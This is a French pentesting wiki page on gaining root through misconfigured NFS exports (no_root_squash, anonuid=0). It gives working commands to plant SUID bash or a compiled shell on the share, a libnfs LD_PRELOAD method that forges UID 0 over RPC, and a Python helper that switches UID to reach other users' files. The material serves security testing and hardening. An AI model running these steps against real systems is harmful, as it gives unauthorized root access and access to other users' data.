# Escalade de privilèges due à une mauvaise configuration NFS No Root Squash

{{#include ../../banners/hacktricks-training.md}}

## Informations de base sur le squashing

Avec NFS AUTH_SYS/AUTH_UNIX, le serveur base les vérifications des permissions de fichiers sur les `uid` et `gid` fournis dans chaque requête RPC. D’autres mécanismes de sécurité, comme Kerberos, utilisent des identifiants différents, et le serveur peut mapper les identifiants numériques avant de vérifier les permissions.<sup>[[4]](#references)[[5]](#references)</sup>

- **`all_squash`** : Mappe chaque UID et GID vers le compte anonyme, qui est `nobody` (65534) par défaut sous Linux. `no_all_squash` est la valeur par défaut pour les requêtes non-root.<sup>[[4]](#references)</sup>
- **`root_squash`** : Cette option est activée par défaut sous Linux et mappe les requêtes avec UID/GID 0 (root) vers le compte anonyme ; les autres UID et GID ne sont pas mappés.<sup>[[4]](#references)</sup>
- **`no_root_squash`** : Désactive le squashing de root, de sorte que les requêtes avec UID/GID 0 peuvent être traitées comme venant de root sur le serveur.<sup>[[4]](#references)</sup>

Si un client autorisé peut monter un export accessible en écriture dans **`/etc/exports`** configuré avec **`no_root_squash`**, ses requêtes avec UID/GID 0 peuvent y écrire en tant qu’utilisateur root du serveur.<sup>[[4]](#references)</sup>

`root_squash` ne remappe que l’UID/GID 0 ; avec AUTH_SYS, un **UID/GID numérique non nul** du client autorisé peut toujours correspondre à un autre compte sur le serveur. Un export accessible en écriture peut donc permettre un accès entre utilisateurs, même avec le squashing de root, si le client peut créer un fichier avec cette identité numérique et que le serveur autorise l’accès. Pour un transfert SUID/SGID, vérifiez également le propriétaire du fichier obtenu, les droits d’exécution, l’état `nosuid` du montage côté serveur, les ACL et SELinux ou toute autre politique. Le chemin exporté, l’option `rw` ou la seule correspondance des numéros ne prouve pas que le client est autorisé, que l’export est actif ou que les deux hôtes partagent le même mappage d’identité effectif. Examinez passivement `/etc/exports` et les métadonnées locales ; ne montez pas de nouveau partage et ne créez pas de fichier de test pendant l’énumération.<sup>[[4]](#references)[[5]](#references)</sup>

Pour plus d’informations sur **NFS**, consultez :

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Escalade de privilèges

### Mappage anonyme équivalent à root

Ne vérifiez pas uniquement la présence de `no_root_squash`. Avec `root_squash,anonuid=0,anongid=0`, la requête d’un client avec UID/GID 0 est mappée **à nouveau vers root**. Avec `all_squash,anonuid=0,anongid=0`, même les identités non-root du client sont mappées vers root sur le serveur. Sur un export `sec=sys` accessible en écriture, l’une ou l’autre de ces configurations peut fournir le mécanisme de création de fichiers appartenant à root utilisé dans le transfert SUID ci-dessous ; les restrictions concernant les clients autorisés et le montage côté victime s’appliquent toujours.<sup>[[4]](#references)</sup>

Sur le serveur, utilisez `exportfs -v` pour examiner l’export actif et ses options pour le **client correspondant**, notamment `rw`, `sec=`, le mode de squashing et `anonuid`/`anongid`. Examinez également `/etc/exports.d/*.exports` lors de l’analyse de la configuration ; `/etc/exports` seul peut être incomplet.<sup>[[4]](#references)[[6]](#references)</sup>

```bash
# Example /etc/exports entries: squashed requests map to server UID 0
/srv/share 192.0.2.10(rw,sec=sys,root_squash,anonuid=0,anongid=0)
/srv/share 192.0.2.11(rw,sec=sys,all_squash,anonuid=0,anongid=0)
```

### Exploitation à distance

Option 1 avec bash :
- Sur un client autorisé, montez en tant que root un export accessible en écriture, copiez-y **`/bin/bash`**, définissez son bit **SUID**, puis exécutez-le depuis un point de montage de la victime qui n’utilise pas `nosuid`.<sup>[[2]](#references)[[4]](#references)</sup>
    - Pour que le fichier téléversé reste la propriété de root, le serveur doit préserver l’UID client 0 avec **`no_root_squash`** ou mapper la requête vers l’UID 0 avec **`anonuid=0`**. Sinon, un binaire SUID appartenant à un autre compte n’est possible que si le client peut le créer ou en être propriétaire avec l’UID/GID numérique de ce compte.<sup>[[4]](#references)</sup>

```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```

Option 2 avec du code C compilé :
- Montez le répertoire depuis un client autorisé, copiez-y un payload compilé qui exploite les permissions SUID, définissez son bit **SUID**, puis exécutez-le depuis la victime (voir quelques [payloads SUID en C](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)).
    - Mêmes restrictions qu’avant

```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```

### Exploit local

> [!TIP]
> Notez que si vous pouvez créer un **tunnel de votre machine vers la machine victime, vous pouvez toujours utiliser la version Remote pour exploiter cette élévation de privilèges en tunnellisant les ports requis**.\
> L’astuce suivante est utile lorsque `/etc/exports` limite l’export à l’IP de la victime : le client distant ne peut pas le monter, mais la technique locale peut fonctionner via le partage déjà monté sur l’hôte autorisé.<sup>[[2]](#references)</sup>\
> Pour cette méthode libnfs sans privilèges, l’export dans **`/etc/exports`** doit utiliser l’option `insecure` afin que le processus puisse utiliser un port source non réservé ; `secure` est l’option par défaut, mais un processus capable de lier un port réservé n’a pas besoin de cette option.<sup>[[1]](#references)[[4]](#references)</sup>

### Informations de base

Un client NFSv3 AUTH_UNIX inclut son UID effectif, son GID et ses groupes dans chaque appel, et le serveur les utilise pour vérifier les permissions. Cette technique locale exploite ce modèle en forgeant les identifiants RPC via [libnfs](https://github.com/sahlberg/libnfs) ; son module preload permet de remplacer l’UID/GID dans le contexte NFS.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[5]](#references)</sup>

#### Compilation de la bibliothèque

L’exemple libnfs peut nécessiter des ajustements pour le noyau cible ; le guide utilisé ici précise qu’il faut commenter les appels système fallocate avant de compiler le module preload.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```

#### Exécution de l'exploit

L'exemple crée un petit programme auxiliaire en C qui lance un shell, le place ensuite sur le partage et utilise `ld_nfs.so` avec l'UID 0 dans le contexte NFS pour le rendre SUID-root.<sup>[[1]](#references)[[2]](#references)</sup>

1. **Compiler le code de l'exploit :**

```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **Déposez l’exploit sur le partage et modifiez ses permissions en falsifiant l’UID**.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **Exécutez l’exploit pour obtenir les privilèges root**.<sup>[[2]](#references)</sup>

```bash
/mnt/share/a.out
#root
```

### Bonus : NFShell pour un accès furtif aux fichiers

Une fois l’accès root obtenu, ce modèle `nfsh.py` définit l’UID effectif sur l’UID du fichier cible avant d’exécuter une commande, permettant d’y accéder sans modifier récursivement le propriétaire.<sup>[[2]](#references)</sup>

```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
    try:
        uid = os.stat(filepath).st_uid
    except OSError as e:
        return get_file_uid(os.path.dirname(filepath))
    return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```

Exécuter comme :

```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```



## References

- [1] [lnv42/libnfs](https://github.com/lnv42/libnfs)
- [2] [L’histoire d’une élévation de privilèges NFS peu connue](https://www.errno.fr/nfs_privesc.html)
- [3] [sahlberg/libnfs](https://github.com/sahlberg/libnfs)
- [4] [exports(5) — page de manuel Linux](https://man7.org/linux/man-pages/man5/exports.5.html)
- [5] [RFC 1813 : spécification du protocole NFS version 3](https://datatracker.ietf.org/doc/html/rfc1813)
- [6] [exportfs(8) — page de manuel Linux](https://man7.org/linux/man-pages/man8/exportfs.8.html)
{{#include ../../banners/hacktricks-training.md}}
